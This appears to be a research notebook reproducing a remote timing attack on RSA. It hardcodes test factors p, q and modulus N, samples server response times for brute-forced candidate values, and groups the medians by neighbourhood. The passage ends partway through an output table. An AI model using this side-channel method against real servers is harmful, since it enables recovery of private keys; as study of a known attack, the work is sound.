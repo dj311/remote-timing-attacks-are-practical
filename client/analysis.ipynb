{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Remote Timing Attacks are Practical"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "import scipy\n",
    "import scipy.signal\n",
    "import seaborn\n",
    "import sympy\n",
    "import pandas\n",
    "import os\n",
    "import matplotlib.pyplot as plt\n",
    "\n",
    "from IPython import display\n",
    "from pprint import pprint"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "import tls\n",
    "import attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "TODO: Intro"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Theory"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Attack Setup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "p = sympy.Integer(11693128827090800677443535237632476895247105886644942164014088484470194179491435241190389270827811769965853291192455791684691555403909415703633832493911789)\n",
    "q = sympy.Integer(11353860437120204348539420361367294927683441924641720282978666316144621735920188475867378638813811676070362003602263559496393696538309271007870774914687283)\n",
    "N = sympy.Integer(132762152776056020551326919245624484615462467876809681535549565118332290525598572815747323476102181376625279228965473106140757139049665124368186142774966643990206422037551427526013151129106319233128471783533673959766053786798472937188481868923726256436384468384858420931063093337134977283618537887974322079287)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exploratory Analysis\n",
    "The aim of this notebook is to sample the server response times for a bunch of `g` values, and find out if the distribution is meaningfully different between them."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Taking 89600 samples...\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>point</th>\n",
       "      <th>time</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>2160937</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>2047486</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>2063136</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>2282664</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>2304663</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>255995</th>\n",
       "      <td>1319831093103724401989318085760887978173750072...</td>\n",
       "      <td>2749682</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>255996</th>\n",
       "      <td>1319831093103724401989318085760887978173750072...</td>\n",
       "      <td>2655990</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>255997</th>\n",
       "      <td>1319831093103724401989318085760887978173750072...</td>\n",
       "      <td>2660019</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>255998</th>\n",
       "      <td>1319831093103724401989318085760887978173750072...</td>\n",
       "      <td>2642634</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>255999</th>\n",
       "      <td>1319831093103724401989318085760887978173750072...</td>\n",
       "      <td>2694614</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>256000 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                    point     time\n",
       "0       6703903964971298549787012499102923063739682910...  2160937\n",
       "1       6703903964971298549787012499102923063739682910...  2047486\n",
       "2       6703903964971298549787012499102923063739682910...  2063136\n",
       "3       6703903964971298549787012499102923063739682910...  2282664\n",
       "4       6703903964971298549787012499102923063739682910...  2304663\n",
       "...                                                   ...      ...\n",
       "255995  1319831093103724401989318085760887978173750072...  2749682\n",
       "255996  1319831093103724401989318085760887978173750072...  2655990\n",
       "255997  1319831093103724401989318085760887978173750072...  2660019\n",
       "255998  1319831093103724401989318085760887978173750072...  2642634\n",
       "255999  1319831093103724401989318085760887978173750072...  2694614\n",
       "\n",
       "[256000 rows x 2 columns]"
      ]
     },
     "execution_count": 56,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "filename = \"./measurements/bruteforce-top-bits3.txt\"\n",
    "\n",
    "if not os.path.exists(filename):\n",
    "    gs = attack.bruteforce_most_significant_bits(\n",
    "        num_bits=6,\n",
    "        neighbourhood_size=400,\n",
    "    )\n",
    "    print(\"Taking {} samples...\".format(len(gs)*20))\n",
    "    raw_samples = attack.sample(\n",
    "        gs,\n",
    "        sample_size=20,\n",
    "        u_g=True,\n",
    "        N=N,\n",
    "   )\n",
    "    samples = pandas.DataFrame.from_records(\n",
    "        raw_samples,\n",
    "        columns=[\"point\", \"time\"],\n",
    "    )\n",
    "    samples.to_csv(filename, sep=\" \")\n",
    "\n",
    "else:\n",
    "    samples = pandas.read_csv(\n",
    "        filename,\n",
    "        sep=\" \",\n",
    "        usecols=[\"point\", \"time\"],\n",
    "    )\n",
    "\n",
    "samples['point'] = samples['point'].apply(sympy.Integer)\n",
    "samples"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In the paper, they take median time for each point. By taking the minimum, I hope to extract the fastest time possible, which should be the time with minimal context switches and other delays. This works provided the only sources of unwanted noise _add time_ (rather than remove it)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>point</th>\n",
       "      <th>time</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>2503221.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>2562910.5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>2559055.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>2411222.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>2516124.5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12795</th>\n",
       "      <td>1319831093103724401989318085760887978173750072...</td>\n",
       "      <td>2625378.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12796</th>\n",
       "      <td>1319831093103724401989318085760887978173750072...</td>\n",
       "      <td>2638380.5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12797</th>\n",
       "      <td>1319831093103724401989318085760887978173750072...</td>\n",
       "      <td>2632225.5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12798</th>\n",
       "      <td>1319831093103724401989318085760887978173750072...</td>\n",
       "      <td>2632072.5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12799</th>\n",
       "      <td>1319831093103724401989318085760887978173750072...</td>\n",
       "      <td>2620218.0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>12800 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                   point       time\n",
       "0      6703903964971298549787012499102923063739682910...  2503221.0\n",
       "1      6703903964971298549787012499102923063739682910...  2562910.5\n",
       "2      6703903964971298549787012499102923063739682910...  2559055.0\n",
       "3      6703903964971298549787012499102923063739682910...  2411222.0\n",
       "4      6703903964971298549787012499102923063739682910...  2516124.5\n",
       "...                                                  ...        ...\n",
       "12795  1319831093103724401989318085760887978173750072...  2625378.0\n",
       "12796  1319831093103724401989318085760887978173750072...  2638380.5\n",
       "12797  1319831093103724401989318085760887978173750072...  2632225.5\n",
       "12798  1319831093103724401989318085760887978173750072...  2632072.5\n",
       "12799  1319831093103724401989318085760887978173750072...  2620218.0\n",
       "\n",
       "[12800 rows x 2 columns]"
      ]
     },
     "execution_count": 57,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "samples = samples.groupby(by=\"point\").median().reset_index()\n",
    "samples"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We can group samples into their respective \"neighbourhoods\" considering their most significant bits only."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [],
   "source": [
    "NUM_BITS = 12\n",
    "\n",
    "def point_to_neighbourhood(point):\n",
    "    point_int = sympy.Integer(point)\n",
    "    point_bits = attack.sympy_integer_to_bits(point_int)\n",
    "    neighbourhood_point_bits = point_bits[0:NUM_BITS] + [0] * (512-NUM_BITS)\n",
    "    neighbourhood_point_int = attack.bits_to_sympy_integer(neighbourhood_point_bits)\n",
    "    return neighbourhood_point_int\n",
    "\n",
    "samples['neighbourhood'] = samples['point'].apply(point_to_neighbourhood)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Sum together the measurements in each neighbourhood:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>neighbourhood</th>\n",
       "      <th>time</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>2.546387e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>6913400963876651629467856639699889409481548001...</td>\n",
       "      <td>2.573206e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>7122897962782004709148700780296855755223413092...</td>\n",
       "      <td>2.565802e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>7332394961687357788829544920893822100965278183...</td>\n",
       "      <td>2.557721e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>7541891960592710868510389061490788446707143274...</td>\n",
       "      <td>2.563430e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>7751388959498063948191233202087754792449008365...</td>\n",
       "      <td>2.570765e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>7960885958403417027872077342684721138190873455...</td>\n",
       "      <td>2.572796e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>8170382957308770107552921483281687483932738546...</td>\n",
       "      <td>2.543060e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>8379879956214123187233765623878653829674603637...</td>\n",
       "      <td>2.572941e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>8589376955119476266914609764475620175416468728...</td>\n",
       "      <td>2.571914e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>8798873954024829346595453905072586521158333819...</td>\n",
       "      <td>2.575323e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>9008370952930182426276298045669552866900198910...</td>\n",
       "      <td>2.565204e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>9217867951835535505957142186266519212642064001...</td>\n",
       "      <td>2.559477e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>9427364950740888585637986326863485558383929092...</td>\n",
       "      <td>2.535291e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>9636861949646241665318830467460451904125794183...</td>\n",
       "      <td>2.586082e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>9846358948551594744999674608057418249867659274...</td>\n",
       "      <td>2.592107e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>16</th>\n",
       "      <td>1005585594745694782468051874865438459560952436...</td>\n",
       "      <td>2.581480e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>17</th>\n",
       "      <td>1026535294636230090436136288925135094135138945...</td>\n",
       "      <td>2.559521e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>1047484994526765398404220702984831728709325454...</td>\n",
       "      <td>2.579844e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>19</th>\n",
       "      <td>1068434694417300706372305117044528363283511963...</td>\n",
       "      <td>2.578337e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>20</th>\n",
       "      <td>1089384394307836014340389531104224997857698472...</td>\n",
       "      <td>2.563472e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>21</th>\n",
       "      <td>1110334094198371322308473945163921632431884982...</td>\n",
       "      <td>2.555145e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22</th>\n",
       "      <td>1131283794088906630276558359223618267006071491...</td>\n",
       "      <td>2.565912e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>23</th>\n",
       "      <td>1152233493979441938244642773283314901580258000...</td>\n",
       "      <td>2.562914e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>24</th>\n",
       "      <td>1173183193869977246212727187343011536154444509...</td>\n",
       "      <td>2.543527e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25</th>\n",
       "      <td>1194132893760512554180811601402708170728631018...</td>\n",
       "      <td>2.587840e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>26</th>\n",
       "      <td>1215082593651047862148896015462404805302817527...</td>\n",
       "      <td>2.591717e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>27</th>\n",
       "      <td>1236032293541583170116980429522101439877004036...</td>\n",
       "      <td>2.579699e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>28</th>\n",
       "      <td>1256981993432118478085064843581798074451190545...</td>\n",
       "      <td>2.573653e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>29</th>\n",
       "      <td>1277931693322653786053149257641494709025377054...</td>\n",
       "      <td>2.570734e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>30</th>\n",
       "      <td>1298881393213189094021233671701191343599563563...</td>\n",
       "      <td>2.575893e+06</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31</th>\n",
       "      <td>1319831093103724401989318085760887978173750072...</td>\n",
       "      <td>2.546416e+06</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                        neighbourhood          time\n",
       "0   6703903964971298549787012499102923063739682910...  2.546387e+06\n",
       "1   6913400963876651629467856639699889409481548001...  2.573206e+06\n",
       "2   7122897962782004709148700780296855755223413092...  2.565802e+06\n",
       "3   7332394961687357788829544920893822100965278183...  2.557721e+06\n",
       "4   7541891960592710868510389061490788446707143274...  2.563430e+06\n",
       "5   7751388959498063948191233202087754792449008365...  2.570765e+06\n",
       "6   7960885958403417027872077342684721138190873455...  2.572796e+06\n",
       "7   8170382957308770107552921483281687483932738546...  2.543060e+06\n",
       "8   8379879956214123187233765623878653829674603637...  2.572941e+06\n",
       "9   8589376955119476266914609764475620175416468728...  2.571914e+06\n",
       "10  8798873954024829346595453905072586521158333819...  2.575323e+06\n",
       "11  9008370952930182426276298045669552866900198910...  2.565204e+06\n",
       "12  9217867951835535505957142186266519212642064001...  2.559477e+06\n",
       "13  9427364950740888585637986326863485558383929092...  2.535291e+06\n",
       "14  9636861949646241665318830467460451904125794183...  2.586082e+06\n",
       "15  9846358948551594744999674608057418249867659274...  2.592107e+06\n",
       "16  1005585594745694782468051874865438459560952436...  2.581480e+06\n",
       "17  1026535294636230090436136288925135094135138945...  2.559521e+06\n",
       "18  1047484994526765398404220702984831728709325454...  2.579844e+06\n",
       "19  1068434694417300706372305117044528363283511963...  2.578337e+06\n",
       "20  1089384394307836014340389531104224997857698472...  2.563472e+06\n",
       "21  1110334094198371322308473945163921632431884982...  2.555145e+06\n",
       "22  1131283794088906630276558359223618267006071491...  2.565912e+06\n",
       "23  1152233493979441938244642773283314901580258000...  2.562914e+06\n",
       "24  1173183193869977246212727187343011536154444509...  2.543527e+06\n",
       "25  1194132893760512554180811601402708170728631018...  2.587840e+06\n",
       "26  1215082593651047862148896015462404805302817527...  2.591717e+06\n",
       "27  1236032293541583170116980429522101439877004036...  2.579699e+06\n",
       "28  1256981993432118478085064843581798074451190545...  2.573653e+06\n",
       "29  1277931693322653786053149257641494709025377054...  2.570734e+06\n",
       "30  1298881393213189094021233671701191343599563563...  2.575893e+06\n",
       "31  1319831093103724401989318085760887978173750072...  2.546416e+06"
      ]
     },
     "execution_count": 59,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "samples = samples.groupby(by=\"neighbourhood\").mean().reset_index()\n",
    "samples"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Since we know the factors of `N` (`q` and `p` with `q<p`) we can consider each point relative in size to these factors. When plotting, we are looking for peaks and troughs near whole multples of `p` and `q`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>neighbourhood</th>\n",
       "      <th>time</th>\n",
       "      <th>point_relative_to_sqrt_n</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>6703903964971298549787012499102923063739682910...</td>\n",
       "      <td>2.546387e+06</td>\n",
       "      <td>0.581823</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>6913400963876651629467856639699889409481548001...</td>\n",
       "      <td>2.573206e+06</td>\n",
       "      <td>0.600005</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>7122897962782004709148700780296855755223413092...</td>\n",
       "      <td>2.565802e+06</td>\n",
       "      <td>0.618187</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>7332394961687357788829544920893822100965278183...</td>\n",
       "      <td>2.557721e+06</td>\n",
       "      <td>0.636369</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>7541891960592710868510389061490788446707143274...</td>\n",
       "      <td>2.563430e+06</td>\n",
       "      <td>0.654551</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>7751388959498063948191233202087754792449008365...</td>\n",
       "      <td>2.570765e+06</td>\n",
       "      <td>0.672732</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>7960885958403417027872077342684721138190873455...</td>\n",
       "      <td>2.572796e+06</td>\n",
       "      <td>0.690914</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>8170382957308770107552921483281687483932738546...</td>\n",
       "      <td>2.543060e+06</td>\n",
       "      <td>0.709096</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>8379879956214123187233765623878653829674603637...</td>\n",
       "      <td>2.572941e+06</td>\n",
       "      <td>0.727278</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>8589376955119476266914609764475620175416468728...</td>\n",
       "      <td>2.571914e+06</td>\n",
       "      <td>0.745460</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>8798873954024829346595453905072586521158333819...</td>\n",
       "      <td>2.575323e+06</td>\n",
       "      <td>0.763642</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>9008370952930182426276298045669552866900198910...</td>\n",
       "      <td>2.565204e+06</td>\n",
       "      <td>0.781824</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>9217867951835535505957142186266519212642064001...</td>\n",
       "      <td>2.559477e+06</td>\n",
       "      <td>0.800006</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>9427364950740888585637986326863485558383929092...</td>\n",
       "      <td>2.535291e+06</td>\n",
       "      <td>0.818188</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>9636861949646241665318830467460451904125794183...</td>\n",
       "      <td>2.586082e+06</td>\n",
       "      <td>0.836370</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>9846358948551594744999674608057418249867659274...</td>\n",
       "      <td>2.592107e+06</td>\n",
       "      <td>0.854552</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>16</th>\n",
       "      <td>1005585594745694782468051874865438459560952436...</td>\n",
       "      <td>2.581480e+06</td>\n",
       "      <td>0.872734</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>17</th>\n",
       "      <td>1026535294636230090436136288925135094135138945...</td>\n",
       "      <td>2.559521e+06</td>\n",
       "      <td>0.890916</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>1047484994526765398404220702984831728709325454...</td>\n",
       "      <td>2.579844e+06</td>\n",
       "      <td>0.909098</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>19</th>\n",
       "      <td>1068434694417300706372305117044528363283511963...</td>\n",
       "      <td>2.578337e+06</td>\n",
       "      <td>0.927280</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>20</th>\n",
       "      <td>1089384394307836014340389531104224997857698472...</td>\n",
       "      <td>2.563472e+06</td>\n",
       "      <td>0.945462</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>21</th>\n",
       "      <td>1110334094198371322308473945163921632431884982...</td>\n",
       "      <td>2.555145e+06</td>\n",
       "      <td>0.963644</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22</th>\n",
       "      <td>1131283794088906630276558359223618267006071491...</td>\n",
       "      <td>2.565912e+06</td>\n",
       "      <td>0.981826</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>23</th>\n",
       "      <td>1152233493979441938244642773283314901580258000...</td>\n",
       "      <td>2.562914e+06</td>\n",
       "      <td>1.000008</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>24</th>\n",
       "      <td>1173183193869977246212727187343011536154444509...</td>\n",
       "      <td>2.543527e+06</td>\n",
       "      <td>1.018190</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25</th>\n",
       "      <td>1194132893760512554180811601402708170728631018...</td>\n",
       "      <td>2.587840e+06</td>\n",
       "      <td>1.036372</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>26</th>\n",
       "      <td>1215082593651047862148896015462404805302817527...</td>\n",
       "      <td>2.591717e+06</td>\n",
       "      <td>1.054554</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>27</th>\n",
       "      <td>1236032293541583170116980429522101439877004036...</td>\n",
       "      <td>2.579699e+06</td>\n",
       "      <td>1.072736</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>28</th>\n",
       "      <td>1256981993432118478085064843581798074451190545...</td>\n",
       "      <td>2.573653e+06</td>\n",
       "      <td>1.090918</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>29</th>\n",
       "      <td>1277931693322653786053149257641494709025377054...</td>\n",
       "      <td>2.570734e+06</td>\n",
       "      <td>1.109099</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>30</th>\n",
       "      <td>1298881393213189094021233671701191343599563563...</td>\n",
       "      <td>2.575893e+06</td>\n",
       "      <td>1.127281</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31</th>\n",
       "      <td>1319831093103724401989318085760887978173750072...</td>\n",
       "      <td>2.546416e+06</td>\n",
       "      <td>1.145463</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                        neighbourhood          time  \\\n",
       "0   6703903964971298549787012499102923063739682910...  2.546387e+06   \n",
       "1   6913400963876651629467856639699889409481548001...  2.573206e+06   \n",
       "2   7122897962782004709148700780296855755223413092...  2.565802e+06   \n",
       "3   7332394961687357788829544920893822100965278183...  2.557721e+06   \n",
       "4   7541891960592710868510389061490788446707143274...  2.563430e+06   \n",
       "5   7751388959498063948191233202087754792449008365...  2.570765e+06   \n",
       "6   7960885958403417027872077342684721138190873455...  2.572796e+06   \n",
       "7   8170382957308770107552921483281687483932738546...  2.543060e+06   \n",
       "8   8379879956214123187233765623878653829674603637...  2.572941e+06   \n",
       "9   8589376955119476266914609764475620175416468728...  2.571914e+06   \n",
       "10  8798873954024829346595453905072586521158333819...  2.575323e+06   \n",
       "11  9008370952930182426276298045669552866900198910...  2.565204e+06   \n",
       "12  9217867951835535505957142186266519212642064001...  2.559477e+06   \n",
       "13  9427364950740888585637986326863485558383929092...  2.535291e+06   \n",
       "14  9636861949646241665318830467460451904125794183...  2.586082e+06   \n",
       "15  9846358948551594744999674608057418249867659274...  2.592107e+06   \n",
       "16  1005585594745694782468051874865438459560952436...  2.581480e+06   \n",
       "17  1026535294636230090436136288925135094135138945...  2.559521e+06   \n",
       "18  1047484994526765398404220702984831728709325454...  2.579844e+06   \n",
       "19  1068434694417300706372305117044528363283511963...  2.578337e+06   \n",
       "20  1089384394307836014340389531104224997857698472...  2.563472e+06   \n",
       "21  1110334094198371322308473945163921632431884982...  2.555145e+06   \n",
       "22  1131283794088906630276558359223618267006071491...  2.565912e+06   \n",
       "23  1152233493979441938244642773283314901580258000...  2.562914e+06   \n",
       "24  1173183193869977246212727187343011536154444509...  2.543527e+06   \n",
       "25  1194132893760512554180811601402708170728631018...  2.587840e+06   \n",
       "26  1215082593651047862148896015462404805302817527...  2.591717e+06   \n",
       "27  1236032293541583170116980429522101439877004036...  2.579699e+06   \n",
       "28  1256981993432118478085064843581798074451190545...  2.573653e+06   \n",
       "29  1277931693322653786053149257641494709025377054...  2.570734e+06   \n",
       "30  1298881393213189094021233671701191343599563563...  2.575893e+06   \n",
       "31  1319831093103724401989318085760887978173750072...  2.546416e+06   \n",
       "\n",
       "    point_relative_to_sqrt_n  \n",
       "0                   0.581823  \n",
       "1                   0.600005  \n",
       "2                   0.618187  \n",
       "3                   0.636369  \n",
       "4                   0.654551  \n",
       "5                   0.672732  \n",
       "6                   0.690914  \n",
       "7                   0.709096  \n",
       "8                   0.727278  \n",
       "9                   0.745460  \n",
       "10                  0.763642  \n",
       "11                  0.781824  \n",
       "12                  0.800006  \n",
       "13                  0.818188  \n",
